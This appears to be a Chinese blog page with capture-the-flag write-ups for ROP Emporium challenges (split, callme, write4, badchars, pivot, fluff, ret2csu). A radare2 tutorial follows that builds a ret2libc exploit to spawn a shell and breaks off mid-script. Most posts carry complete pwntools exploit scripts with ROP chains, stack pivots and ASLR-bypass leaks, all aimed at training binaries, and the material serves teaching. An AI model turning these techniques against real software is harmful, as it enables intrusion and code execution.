不过我们要找到一个办法，直接将这个地址传入RDI寄存器（x86-64传参时依次通过rdi,rsi，，，传参，rdi是第一个） 这时候我们就需要ROPgadget了，简单地说，它们就是写以ret指令结尾的指令序列。指定–only来筛选 找到了很多gadget，那么哪个符合要求呢 我们前面提到必须将值传入RDI，所以要找到pop rdi 所以符合要求的是地址是0x400883 我们传递这个gadget地址（0x400883）后，它会把栈中下一个值传到RDI寄存器中，所以下一个地址应该是能够打印flag的字符串的地址(0x601060)，最后是system（）函数的地址（0x400810） 使用python简单地将exp输出到input 1python2 -c &#x27;from pwn import *;print(&quot;A&quot; * 40+p64(0x0400883) + p64(0x00601060)+p64(0x00400810))&#x27; &gt; input 在gdb中查看，发现确实输出了flag。 同样也可以通过pwntools快速写一个exp 12345678910111213141516171819from pwn import *io = process(&quot;./split&quot;)elf = ELF(&quot;./split&quot;)system_addr = elf.symbols[&#x27;system&#x27;]pop_rdi_ret = 0x0000000000400883cat_flag_addr = 0x601060io.recvuntil(&quot;&gt;&quot;)payload = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;payload += p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)io.sendline(payload)io.interactive() callme首先看一下二进制文件的信息 rabin -I callme 可以看到nx为true，同样设置了栈不可执行 接下来在r2中加载分析 r2 -AAA callme afl列出函数 在上图中看到了此前出现过的main,pwnem,usefulFunction,不过这里比较有意思的是还出现了callme_one,callme_two,callme_three 我们看看题目的描述 我们知道需要通过对应的顺序传入对应的参数才能得到flag 即： callme_one(1,2,3),callme_two(1,2,3),callme_three(1,2,3) 每个函数都有三个参数 在进一步分析他们之前，我们先来看看main 在上图中可以看到还是调用了pwnme。 我们跟着分析pwnme，看看buffer的大小是否还是一样 pdf @ sym.pwnme 可以看到缓冲区大小还是32字节，fgets函数容易造成缓冲区溢出 再看看usefulFunction中有什么 pdf @ sym.usefulFunction 从上图中可以看到是按照给出的参数、顺序来调用callme_1,2,3三个函数的 所以我们在写的exp时的依据就是这个 需要注意的是，传参时顺序是相反的 我们可以在这个网站（https://godbolt.org/）自己写一段简单的函数并且在main中调用，对照汇编分析 为了将值放入用于传递参数的寄存器中，我们还要用到rop gadget，用于将值从栈pop到这些寄存器中 ROPgadget –binary callme 在0x401ab0,这个gadget可以将值从栈上pop到对应的三个寄存器上 这部分的exp比较长，我们直接用pwntools写，关键是四个地址，一个是rop gadget，已经知道了，另外三个是callme_1,2,3的地址，分别如下 照用以前的框架。使用pwntools进行编写。 1234567891011121314151617181920212223from pwn import *def add_arguments(payload): payload += p64(0x0000000000401ab0) # Address of gadget pop rdi; pop rsi; pop rdx; ret; payload += p64(0x1) payload += p64(0x2) payload += p64(0x3) return payloadoffset = cyclic(40) # 40 bytes used to overflow.payload = offsetpayload = add_arguments(payload)payload += p64(0x00401850) # Address of callme_one function.payload = add_arguments(payload)payload += p64(0x00401870) # Address of callme_two function.payload = add_arguments(payload)payload += p64(0x00401810) # Address of callme_three function.sh = process(&#x27;callme&#x27;)sh.recv()sh.sendline(payload)output = sh.recvall()print(output) 运行python文件，取得flag。 Write4 先通过rabin2 看一下基础的文件信息 rabin2 -I write4 被设置了nx。也可以用 r2 -AAA .&#x2F;write4后用i~nx来筛选查看。 在前面的实验中当我们需要打印flag时，用的是文件自身的字符串，我们看看这题里有没有，直接使用strings配合grep过滤 strings write4 | grep ‘cat flag.txt’ 可以看到，这种字符串是不存在的 接下来先看看涉及的函数 r2 -AAA .&#x2F;write4 afl 看看usefulFunction里会不会有我们需要的信息，反汇编它 pdf @ sym.usefulFunction 在上图中我们看到，我们调用了system(),不过传给system的是&#x2F;bin&#x2F;ls，也就是说会执行ls命令 不过我们想执行的是cat flag.txt的命令，因为二进制文件中不存在这种字符串，所以我们需要手动进行。 首先需要考虑的是，把cat flag.txt写到哪个地址 readelf -a write4 我们关注输出的sectionheaders部分。 可以看到打印出一系列的section，我们需要在其中找到一个合适的，在其中我们可以写入值。 一般我们都会选择写到data，上图中找到了一个data,地址是0x601050，我们使用readelf看看在这个section里有没有什么数据 readelf -x .data write4 可以看到这个地址是空的，所以我们写入这里是ok的 接下来我们还是需要ropgadget找到特定的gadget让我们能够将字符串放入这儿 ROPgadget –binary write4，结合–only或grep进行筛选。 这里打印出了很多gadget，那么我们需要怎样的呢 首先这个gadget要能够将值写入内存地址，在汇编中一般是通过mov体现，比如MOV [r0],r1这样子，这条汇编的意思是将值从寄存器R1移动到寄存器R0所保存的内存地址处。 下图红色选中的就符合要求 地址是0x400820 现在我们可以将值写入内存了，但是我们还需要pop，才能将值写入寄存器中 地址为0x400890 我们还需要返回并获取system（）的地址，并且为了将字符串的地址作为调用system（）时的参数，还需要pop rdi 地址是0x400893 现在关键的地址都有了，可以编写我们的exp了 关键点包括： 使用pop gadget将字符串的地址和字符串放在寄存器中 使用mov gadget将字符串放入给出的内存地址中 使用pop rdi gadget将字符串的地址放入寄存器 调用system（），它使用已经保存了字符串地址的rdi寄存器作为参数寄存器 完整代码： 123456789101112131415161718192021222324252627282930from pwn import *def place_string_at_address(mov_gadget_address, pop_gadget_address, string_address, string): while len(string) % 8 != 0: string += &quot;\\x00&quot; splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)] payload = &quot;&quot; for i in range(len(splitted_string)): # Place the gadgets into the payload. payload += p64(pop_gadget_address) payload += p64(string_address + (i * 8)) payload += splitted_string[i] payload += p64(mov_gadget_address) return payload# 40 bytes of random data.offset = &#x27;A&#x27; * 40offset += place_string_at_address(0x400820, 0x400890, 0x601050, &quot;cat flag.txt&quot;)offset += p64(0x0000000000400893) # Address of pop rdioffset += p64(0x0000000000601050) # Address of stringoffset += p64(0x00400810) # Address of system()print(offset) python 4.py | .&#x2F;write4，运行后如图,拿到了flag badchars 先使用rabin2 -I看一下基础的信息 rabin2 -I badchars 通过r2加载调试分析，afl查看函数 r2 -AAA .&#x2F;badchars afl 可以看到在usefulFunction后还有两个函数，分别是nstrlen,checkBadchars 结合题目的提示 这函数应该是用于检查exp中是否有坏字符的 直接运行badchars,就可以看到坏字符了 .&#x2F;badchars 这些就是我们这次在开发exp时需要避免的 还是和以前一样，看看关键函数的反汇编 pdf @ sym.pwnme 可以看到在pwnme函数中已经给出了坏字符，同时还调用了新的两个函数以及fgets（） 再看看usefulFunction pdf @ sym.usefulFunction 和前面的关卡一样，也是调用了system，执行ls命令 接下来我们通过gdb分析得到覆盖rsp寄存器的偏移 pattern_create 512 input pattern_search 可以看到输入40字节后将会覆盖rsp 回到坏字符的话题来，我们在写exp时用的是十六进制，所以先将这些坏字符转为16进制 另外，空格为 因此，坏字符的16进制分别是 0x62 0x69 0x63 0x2f 0x20 0x66 0x6e 0x73 在使用ROPgadget时通过–badbytes即可过滤掉包含坏字符的项 1ROPgadget --binary badchars --badbytes &quot;62|69|63|2f|20|66|6e|73&quot; 接下来的任务和上一关就一样了，显示找到mov…ret的，然后找对应的pop 地址为0x400b34,0x400b3b 不过因为坏字符的原因，我们无法直接写入cat flag.txt 这时候常用的解决办法是异或 先找到xor的gadget 通过这个gadget我们可以将r14寄存器的值与内存中的值进行异或 所以我们的思路就来了： 我们强行凑对，我们的字符串不直接写cat flag.txt，而是用其他字符代替，这些字符与另外的特定字符异或后会得到cat flag.txt，这样就绕过了坏字符不允许我们直接传入cat flag.txt 的限制 以首字母c为例，哪些字符异或后可以得到c呢？ 我们写一个简单的python脚本跑一下就知道了 完整代码： 12345import stringfor x in string.printable: for y in range(16): if chr(ord(x) ^ y) == &#x27;c&#x27;: print(x + &#x27; &#x27; + str(y)) 因为c是坏字符，这样的话我们就可以用a代替c然后与2异或，从而得到c 这样就解决了坏字符的限制 现在可以写exp了，关键点包括: 1）用aat!alag.txt代替cat flag.txt 2）使用pop gadgets来pop字符串中受限制字符的地址和对应的字符异或，从而得到所需的字符 3）为所有被替换了的字符做相应的操作 4）使用pop，将字符串的地址写入rdi寄存器 5）调用system（）最后得到flag 完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *def place_string_at_address(mov_gadget_address, pop_gadget_address, string_address, string): while len(string) % 8 != 0: string += &quot;\\x00&quot; splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)] payload = &quot;&quot; for i in range(len(splitted_string)): # Place the gadgets into the payload. payload += p64(pop_gadget_address) payload += splitted_string[i] payload += p64(string_address + (i * 8)) payload += p64(mov_gadget_address) return payloadoffset = &#x27;A&#x27; * 40offset += place_string_at_address(0x400b34, 0x400b3b, 0x601071, &quot;aat!alag.txt&quot;)# Now we&#x27;re XORing values from string.# 2 ^ &#x27;a&#x27; = &#x27;c&#x27; offset += p64(0x0000000000400b40)# pop r14; pop r15; retoffset += p64(0x2)offset += p64(0x601071)# 字符位置offset += p64(0x0000000000400b30)# 1 ^ &#x27;!&#x27; = &#x27; &#x27;# String address is 0x601071 because if we would have 0x601070# address of second XORed character would end with 0x73, which# is restricted.offset += p64(0x0000000000400b40)offset += p64(0x1)offset += p64(0x601074)offset += p64(0x0000000000400b30)# 7 ^ &#x27;a&#x27; = &#x27;f&#x27;offset += p64(0x0000000000400b40)offset += p64(0x7)offset += p64(0x601075)offset += p64(0x0000000000400b30)# Pop address of string into RDI and call system()offset += p64(0x0000000000400b39)# pop rdi; retoffset += p64(0x601071)offset += p64(0x004009e8)print(offset) pivotGot表和PLT表操作系统通常使用动态链接的方法来提高程序运行的效率。在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。这样的设计就能提高程序运行的流畅度，也减少了内存空间。而且现代操作系统不允许修改代码段，只能修改数据段，那么GOT表与PLT表就应运而生。 当函数第一次被用到时才进行绑定(符号査找、重定位等),如果没有用到则不进行绑定。 为了提到cpude效率，在程序加载时并不会解析所有函数，而是在某个函数被调用时通过plt和got来对函数解析，然后将获得的函数地址放在got中，下一次调用就会直接使用got中的函数地址来对函数进行调用。 GOT与PLT_got.plt-CSDN博客 pivot首先看一下基本信息 rabin2 -I pivot r2 -AAA .&#x2F;pivot；afl 先看看pwnme pdf @ sym.pwnme 在上图中可以看到我们的exp应该需要两个chain 同时告诉我们从libpivot.so调用了ret2win() 再来看看uselessFunction pdf @ sym.uselessFunction 可以看到调用了foothold_function,但是其自身没有被调用 接下来看看libpivot.so r2 -AAA libpivot.so；afl pdf @sym.ret2win 可以看到ret2win会打印flag 从题目的说明中 我们知道栈空间被限制了，但是我们具体可以放多少空间呢? 使用gdb进行分析 gdb .&#x2F;pivot 输入r运行，然后第一次输入a，第二次输入一串A 看一下rsp的情况 可以看到一共是3个qword，即3个八字节 我们的任务就是通过这些空间，以某种方式把我们的空间pivot到一个更大的空间 我们注意到，在运行的时候，程序会打印出一个缓冲区的地址，这就是第一个fgets使用的。我们可以改变指向那个缓冲区的rsp寄存器的值，这个值将是我们ROPchain的第二段 我们先ropgadget看看可用的gadget ROPgadget –binary pivot 我们可以使用pop rax,ret，然后将缓冲区的地址放在第二个位置上，最后xchg rax,rsp,交换值 这是第一段rop chain 接下来我们要解决的是由于ASLR机制，我们该如何得到ret2win函数的地址 由于plt表与got表的特性，函数第一次调用时plt表指向的got表中存储的执行在plt表中查找函数真实地址的函数地址，查找到函数真实地址后，存储到got表的原来表项中替换掉查找函数的指向地址。以题目为例， foothold_function函数，先调用利用利用plt表中的地址调用一次后，在plot表中会存储其真实地址，利用foothold_function函数与ret2win函数在libpivot32.so的便宜差，通过foothold_function真实地址，计算出ret2win函数的真实地址。 我们可以在pivot32的二进制找到foothold_function的plt和got表项，还可以在libpivot32.so找到ret2win这个函数。 因此解决办法是计算相对于foothold_function的偏移，然后在第二段中加上计算出来的值就可以了 回到r2分析libpivot.so分析时得到的地址 计算偏移为0x14e 然后我们要知道foothold_function在plt,got中的偏移 r2 -AAA .&#x2F;pivot ir 地址是0x602048 这样写第二段ropchain的准备工作也完成了 关键部分在于： 首先调用foothold_function来填充.got.plt pop foothold_function的got到rax寄存器 向rax中添加偏移得到ret2win的 最后进行调用即可 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *# Gadgetspop_rax = p64(0x0000000000400b00)xchg_rax_rsp = p64(0x0000000000400b02)mov_rax_mrax = p64(0x0000000000400b05)pop_rbp = p64(0x0000000000400900)add_rax_rbp = p64(0x0000000000400b09)call_rax = p64(0x000000000040098e)# Addressesfoothold_plt = p64(0x00400850)foothold_got = p64(0x00602048)pivot = process(&#x27;./pivot&#x27;)heap_address = int(pivot.recvline_contains(&#x27;The Old Gods kindly bestow upon you a place to pivot:&#x27;).decode(&#x27;UTF-8&#x27;).split(&#x27; &#x27;)[-1], 16)print(hex(heap_address))heap_address = p64(heap_address)pid = util.proc.pidof(pivot)[0]print(&quot;[*] PID = &quot; + str(pid))# Uncomment this if you want to use the debugger#util.proc.wait_for_debugger(pid)second_stage = b&quot;&quot;second_stage += foothold_plt# 调用foothold_function函数，调用时会将foothold_function函数的实际地址写入到GOT表中second_stage += pop_raxsecond_stage += foothold_got# 将foothold_function函数的GOT地址写入eax寄存器second_stage += mov_rax_mrax# 将foothold_function函数的GOT地址指向的地址放入eax寄存器，即foothold_function函数在内存中的真实地址second_stage += pop_rbpsecond_stage += p64(0x14e)# 将ret2win函数与foothold_function函数在libc.so文件中的相对偏移放入rbpsecond_stage += add_rax_rbp# foothold_function函数真实地址加上ret2win相对于foothold_function函数的offset即得ret2win函数在内存中的实际地址second_stage += call_rax# 使程序跳转到eax中的地址，即泄露的堆空间的入口位置pivot.recvuntil(&quot;Send your second chain now and it will land there&quot;)pivot.sendline(second_stage)first_stage = b&quot;A&quot; * 40first_stage += pop_raxfirst_stage += heap_address# 堆空间的地址放入rax寄存器first_stage += xchg_rax_rsp# 交换eax和esp的值，也就是说程序分配的对空间就被当成栈，交换eax和esp的值，也就是说程序分配的堆空间就被当成栈，ret就会返回到栈顶去执行我们精心设计好的shellcodepivot.recvuntil(&quot;Now kindly send your stack smash&quot;)pivot.sendline(first_stage)output = pivot.recvall()print(output) fluff 先看一下基本信息 rabin2 -I fluff 然后载入r2分析 r2 -AAA .&#x2F;fluff;afl 分别看看pwnme和usefulFunction pdf @ sym.pwnme pdf @ sym.usefulFunction 重复gdb调试过程，可以发现，esp偏移还是40。 然后使用ropgadget找到有用的gadget ROPgadget –binary fluff 首先我们要找到一个gadget用于将字符串写入内存。mov适合的似乎只有下面这一条mov适合的似乎只有下面这一条 如果用了这一条，那么下一个要解决的问题就是怎么将值写入r10、r11寄存器呢 似乎没有可直接写的办法，这时候我们常用的解决办法就是组合多个gadget以将值写入r10为例，我们看看该如何操作 那么这里就需要注意了，按照前面的默认命令，其实ropgadget的搜索深度是10。既然我们需要组合多个gadget，既然越多越多，所以我们可以加上–depth 20，将深度设为20 ROPgadget –binary fluff –depth 20 首先清空r11，有两个办法，要么置零，要么与自身异或 我们看看gadget里有没有符合的 接下来把地址pop到r12里 对应的gadget为 前面r11已经是0了，我们将r12与r11异或，这样其实就相当于间接地使用了mov，将值写入了r11 然后使用xchg交换r11和r10寄存器的值，这样就相当于将地址写到了r10寄存器中 做完这部分工作之后，我们只需pop rdi,ret，字符串的地址作为system（）参数传入，再调用system（）就可以了 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *def place_address(address): payload = p64(0x0000000000400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret; payload += p64(0) # Unused pop r14 payload += p64(0x0000000000400832) # pop r12; mov r13d, 0x604060; ret; payload += p64(address) payload += p64(0x000000000040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret; payload += p64(0) # Unused pop r12 payload += p64(0x0000000000400840) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret; payload += p64(0) # Unused pop r15 return payloaddef place_data(data): payload = p64(0x0000000000400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret; payload += p64(0) # Unused pop r14 payload += p64(0x0000000000400832) # pop r12; mov r13d, 0x604060; ret; payload += data # String to be putted payload += p64(0x000000000040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret; payload += p64(0) # Unused pop r12 return payloaddef write_data(string, address): while len(string) % 8 != 0: string += &quot;\\x00&quot; splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)] payload = &quot;&quot; for i in range(len(splitted_string)): # Put address into r10 register payload += place_address(address + (i * 8)) # Now we have to put actual data in r11 payload += place_data(splitted_string[i]) # Write data to address payload += p64(0x000000000040084e) # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; payload += p64(0) * 2 # Unused pop r13 and pop r12 return payloadoffset = cyclic(40)offset += write_data(&quot;/bin/cat flag.txt&quot;, 0x601050)offset += p64(0x00000000004008c3)offset += p64(0x601050)offset += p64(0x00400810)print(offset) python 6.py | .&#x2F;fluff Ret2csu 没有合适的rop gadgets,该如何在没有pop rdx的情况下写入rdx呢 先看一下基本信息 rabin2 -I ret2csu 载入r2 r2 -AAA ret2csu; afl 看pwnme的反汇编 pdf @ sym.pwnme 可以看到要求rdx必须是指定的字符串 ret2win 我们先看看ropgadget ROPgadget –binary ret2csu 可以看到和rdx相关的只有 ROPgadget –binary ret2csu | grep rdx 没有pop rdx,或mov rdx 所以理论上我们无法绕过关卡的限制，无法设置该寄存器。 此时的解决方案是returnto csu,这是blackhat2018的议题，通过一个通用的gadget来制作rop 在afl命令的输出中我们看到有一个函数，名为__libc_csu_init。x64 下的 __libc_csu_init 这个函数是用来对 libc 进行初始化操作的，而一般的程序用 libc 函数，所以这个函数一定会存在。 (不同版本的这个函数有一定的区别)简单来说就是利用libc_csu_init中的两段代码片段来实现3个参数的传递（间接性的传递参数） 我们反汇编看看 pdf @ sym.__libc_csu_init 在其中我们找到了两个gadget 第一个： 第二个： rdi是第一个参数，rsi是第二个参数，rdx是第三个参数 结合这两个gadget我们知道，rdi来自r13,rsi来自r14,rdx来自r15 前面提到我们要写0xdeadcafebabebeef到rdx,而从0x00400880可以看到写入r15就可以了。通过mov rdx,r15即可实现目的。 但是我们注意到第一个问题是第二个gadget的最后一条不是ret,而是call call qword ptr [r12+rbx*8]，由前可知，r12,rbx都是可控的，所以这个地址是可控的，不过为了控制目的地我们需要rbx和r12，这具体的值是什么呢? IDA注意到 第二个gadget后面是上图的三条指令 在cmp之前，rbx+1了，所以简单起见，我们设置rbx为0，rbp为1，这样cmp得到的结果就是相等 后面紧接着就是add rsp,8 我们知道rsp 是堆栈指针寄存器，通常会指向栈顶位置，堆栈的 pop 和push 操作就是通过改变rsp 的值即移动堆栈指针的位置来实现的。 这里的指令相当于增加了栈空间，我们可以随意填充相应大小即可。 在上面我们设置了rbx为0，所以call的地址就是r12指定了，但是直接把ret2win的地址放入r12会报SIGSEGV。而为了有效地使用movrdx，r15，我们必须确保调用QWORD PTR [r12 + rbx * 8]不是SIGSEGV，cmp rbx，rbp相等且最重要的是RDX的值不会改变。 根据这篇文章（https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html）描述的技巧，我们可以尝试调用__init()函数，通过DYNAMIC变量定位 gdb ret2csu 因为__init使用0x400560地址，我们的指针就是0x600e30 + 8 这些操作完成后，我们就可以正常地在栈上放入ret2win的地址 总结下我们做了哪些事情： 首先调用第一个gadget，地址是0x40089a 将需要的值放在栈上 r12寄存器上是指向__init地址的指针 r15寄存器是0xdeadcafebabebeef rbx寄存器是0x0 rbp寄存器是0x1 第二个gadget地址是0x400880 因为有add rsp,8所以我们需要进行一些填充 将ret2win的值放在栈上 代码： 12345678910111213141516171819202122232425262728293031323334from pwn import *ret2win_adr = 0x4007b1first_gadget_adr = 0x40089asecond_gadget_adr = 0x400880init_pointer = 0x600e38payload = b&quot;A&quot; * 40payload += p64(first_gadget_adr)payload += p64(0x00) # pop rbxpayload += p64(0x01) # pop rbppayload += p64(init_pointer) # pop r12payload += p64(0x00) # pop r13payload += p64(0x00) # pop r14payload += p64(0xdeadcafebabebeef) # pop r15payload += p64(second_gadget_adr)payload += p64(0x00) # add rsp,0x8 paddingpayload += p64(0x00) # rbxpayload += p64(0x00) # rbppayload += p64(0x00) # r12payload += p64(0x00) # r13payload += p64(0x00) # r14payload += p64(0x00) # r15payload += p64(ret2win_adr)ret2csu = process(&#x27;./ret2csu&#x27;)ret2csu.readuntil(&#x27;&gt;&#x27;)ret2csu.sendline(payload)output = ret2csu.readall()print(output)","categories":[{"name":"PWN","slug":"PWN","permalink":"https://qianmuoy.github.io/categories/PWN/"}],"tags":[]},{"title":"Radare入门","slug":"Radare入门","date":"2024-03-01T08:43:19.000Z","updated":"2024-03-01T08:44:19.016Z","comments":true,"path":"2024/03/01/Radare入门/","link":"","permalink":"https://qianmuoy.github.io/2024/03/01/Radare%E5%85%A5%E9%97%A8/","excerpt":"","text":"Radare入门到进阶基本信息radare2是一个开源的逆向工程和二进制分析框架，包括反汇编、分析数据、打补丁、比较数据、搜索、替换、虚拟化等等，同时具备超强的脚本加载能力，它可以运行在几乎所有主流的平台（GNU&#x2F;Linux, .Windows *BSD, iOS, OSX, Solaris…）并且支持很多的cpu架构以及文件格式。 radare2工程是由一系列的组件构成，这些组件可以在 radare2 界面或者单独被使用–比如我们将要在接下来实验中使用到的rahash2, rabin2, ragg2三个组件，所有这些组件赋予了 radare2 强大的静态以及动态分析、十六进制编辑以及溢出漏洞挖掘的能力。 Kali已经自带radare2 我们可以输入-h查看帮助，i开头的命令主要用来获取各种信息，A系列的命令用于分析文件 r2 框架里最强的一个工具 ：rabin2. rabin2 可以获取包括ELF, PE, Mach-O, Java CLASS文件的区段、头信息、导入导出表、字符串相关、入口点等等，并且支持几种格式的输出文件.我们可以使用它来获取二进制文件的基本信息 输入man rabin2查看更多用法。对于反汇编，我们可以输入vv进入图形化界面。输入q则可以退出图形化界面，回到shell 入门首先rabin2加上-I 参数 来让 rabin2 打印出二进制文件的系统属性、语言、字节序、框架、以及使用了哪些 加固技术 我们可以看到这是一个32位的 elf 文件，没有剥离符号表并且是动态链接的 接下来我们尝试运行它 可以看到，不论是否加参数都会显示wrong。 接下来我们使用radare2来进行破解。 看到黄色字体输出了一个地址 (0x08048370)，这就是它自动识别的程序入口点，或者我们也可以使用ie命令手动打印出入口点。 接下来输入aa或者aaa进行细致的分析 分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 ，一个 flag 是所有类似特征的集合 接下来我们看看所有的flag 我们打印出imports下面的信息 为了获取更多的信息，我们可以再列出数据段里的字符串 出现了关键字，一个是success，一个是我们之前运行时的wrong….。那我们接下来就跟着success走，看看哪儿进行了调用 输入命令axt @@ str.*，并使用afl列出分析到的函数 ‘axt’ 命令用来在 data&#x2F;code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）. ‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’） ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。 接下来我们看看radare2分析出来哪些函数 看到两个引起我们注意的sym.beet和sym.rot13 接下来我们用 ‘s main’ 指令定位到main函数入口处，然后用 ‘pdf’输出反汇编代码 分析函数的执行流程，我们知道二进制程序是通过获取 beet函数的返回结果来判断是否正确 输入&#112;&#100;&#x66;&#64;&#x73;&#121;&#x6d;&#x2e;&#98;&#101;&#101;&#116;定位到反汇编 我们看到输入的参数被拷贝到了一个缓存空间里，这个空间的地址是 ‘ebp – local_88h’ 。 ‘local_88h’ 就是十进制的 136。由于4个字节会被用来保存 ebp 的地址，4个字节被用来保存返回地址，所以这个缓冲区得大小是 128个字节.它们加起来刚好是 136. 我们输入的参数被拷贝到缓冲区后被用来和 sym.rot13的返回结果作对比， Rot-13 是一个著名的替换密码算法，在ctf和crackme中被广泛使用，这个函数接受了9个十六进制值作为参数，但是上图中看起来r2好像没有识别出来到底是什么字符，这里我们需要用 ‘ahi s’ 来做些处理。 1ahi s @@=0x080485a3 0x080485ad 0x080485a7 ahi s 是用来设置字符串特定的偏移地址（使用 ahi? 获取更多用法），@@是一个迭代器，可以用来接受后面输入的多个参数,执行完这条命令后，图形视图会自动刷新。重新运行&#x70;&#100;&#x66;&#64;&#x73;&#121;&#109;&#x2e;&#98;&#x65;&#101;&#x74; 可以看到之前无法识别的字符串’Megabeets’(根据字节序反向压栈顺序得到)。这个二进制文件将我们传入的参数来和经过 rot13 处理后的 ‘Megabeets’ 作比较 接下来我们通过rahash2求出这个字符串的校验值 至此，程序的逻辑就很清楚了： ‘Zrtnorrgf’ 就是用来和我们输入的字符串作比较，成功则返回success 接下来输入ood?进入调试模式 将Zrtnorrgf作为参数进行调试 输入dc查看结果 输出了success，我们成功破解了这个小软件，也借此掌握了radare2的基本用法 进阶常用命令： 信息搜集: ​ $ rabin2 -I .&#x2F;program — 查看二进制信息 ii [q] – 查看导出表 ?v sym.imp.func_name — 获取过程链接表中相应函数的地址（func_name@PLT） ?v reloc.func_name —获取全局偏移表中函数的地址（func_name@GOT） ie [q] — 获取入口点地址 内存相关： dmm — 列出模块 (库文件，内存中加载的二进制文件) dmi [addr|libname] [symname] — 列出目标库的符号标识 搜索： &#x2F;?— 列出搜索子命令 &#x2F; string — 搜索内存&#x2F;二进制文件的字符串 &#x2F;R [?] —搜索ROP gadgets &#x2F;R&#x2F; — 使用正则表达式搜索ROP gadgets 调试： dc — 继续执行 dcu addr – 继续执行直到到达指定地址 dcr — 继续执行直到到达ret (使用步过step over) dbt [?] —基于 dbg.btdepth 和 dbg.btalgo显示backtrace追踪函数 doo [args] — 添加参数重新打开调试模式 ds — 步入一条指令（step on） dso — 步过（Step over） Visual Modes pdf @ addr — 打印出相应偏移处的函数的汇编代码 V —视图模式,使用p&#x2F;P to在不同模式间切换 本实验的重点是exp的开发，将使用radare 2绕过启用ASLR的系统上的NX保护的二进制文件，并进行exp的开发。 拿到小程序后，我们首先使用rabin2查看文件相关信息 由上图可以看到二进制文件是NX保护的，这意味着我们不会有一个可执行的堆栈依赖。这就加大了我们写exp的难度，同样，这也给我们的学习与挑战带来了乐趣。 现在我们来看看程序的反汇编。我们先以调试模式打开，然后对符号、函数进行分析 接下来继续执行，直到到达main函数 接下来我们使用vv进入图形化模式 我们可以看到main()函数中通过scanf()帮助我们输入，然后将输入值传递给sym.beet，因此定位到处理我们输入的beet函数。按q退出vv模式 我们可以看到，用户的输入[arg_8h]被复制到了缓冲区[local_88h]，然后正如我们在上一个radare2入门实验中看到的一样,字符串Megabeets将会通过rot13加密，加密后的结果将会与我们的输入进行比较。 此处存在的漏洞是：程序不检查输入的大小，并将输入复制到缓冲区。这意味着，如果我们输入一个大于缓冲区大小的输入，就会导致缓冲区溢出并破坏堆栈 接下来我们来看看我们的exp该怎么编写。 我们的目标是在系统上得到一个shell。首先，我们需要验证确实存在一个易受攻击的函数，然后，我们将找到有效负载覆盖堆栈的偏移量。 我们使用radare2的一个框架ragg2, ragg2允许我们生成一个名为deBruijn序列的循环模式，并检查有效负载覆盖缓冲区的确切偏移量。 接下来我们要做三件事情： 1.使用ragg2将De Bruijn模式的文件写入 2.创建rarun2配置文件和设置输出文件作为标准输入 vim profile.rr2 3.让radare2自动找到偏移值 我们执行了我们的二进制文件，并通过rarun2传递了pattern.txt的内容到stdin，并收到了信号量11 我们注意到提示指向0x41417641？这是一个无效的地址，代表“AvAA”（ascii），这是我们前面生成的模式的一部分。 由上图可以知道140个字节后将会出现返回地址的覆盖，我们可以开始制作我们的payload了。 前面提到我们的机器受ASLR保护所以我们不能预测地址，libc将加载到内存并且地址会发生变换。此外，我们的二进制程序开启NX，这意味着栈是不可执行的，我们不能仅仅把shellcode写入堆栈，跳转到它来执行。虽然这些保护阻止我们使用一些技术开发exp，但它们并不是绝对有效的，我们可以很容易地制造出其他的payload绕过它们 我们再次以调试模式打开二进制文件，并查看库和它使用的函数。 我们已经看到了puts和scanf了，我们可以利用这两个函数来创建一个完美的漏洞。我们的exp的编写基于以下的逻辑：我们可以控制该程序的流程，将尝试执行系统（“&#x2F;bin&#x2F;sh”）从而弹出一个shell。 因此我们需要完成以下几件事情： 1.泄露puts的真实地址 2.计算libc的基址 3.计算system的地址 4.找到包含&#x2F;bin&#x2F;sh字符串的libc的地址 5.使用&#x2F;bin&#x2F;sh进行系统调用，并且拿到shell 先来看看我们exp的框架（exploit1.py） 12345678910111213141516171819202122232425262728293031from pwn import *#Addputs_plt = puts_got = entry_point = #context.log_level = &quot;debug&quot;def main(): #open process p = process(&quot;./megabeets_0x2&quot;) # Initial payload payload = &quot;A&quot;*140 ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) leak = p.recv(4) leak = u32(leak) log.info(&quot;puts is at: 0x%x&quot; % leak) p.clean() if __name__ == &quot;__main__&quot;: main() 我们需要填入的就是puts_plt , puts_got , entry_point 三个地址 我们将利用radare2找到这三个地址 ?v sym.imp.puts命令的意思是获取puts函数在PLT中的地址，接下来获取puts_20在GOT中的地址与程序入口 填入exp，执行 我们执行了三遍，可以看到每次执行后的puts的地址都会发生变化。因此我们不能提前预测地址。现在我们需要找到puts在libc中的偏移，然后计算lib的基址。之后我们根据基址然后使用对应的偏移来计算出system,exit,”&#x2F;bin&#x2F;sh”的真实地址。 Exp（exploit.py）的框架是这样的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *#Addputs_plt = puts_got = entry_point = #Offsetsoffset_puts = offset_system = offset_exit = offset_str_bin_sh = #context.log_level = &quot;debug&quot;def main(): #open process p = process(&quot;./megabeets_0x2&quot;) # Initial 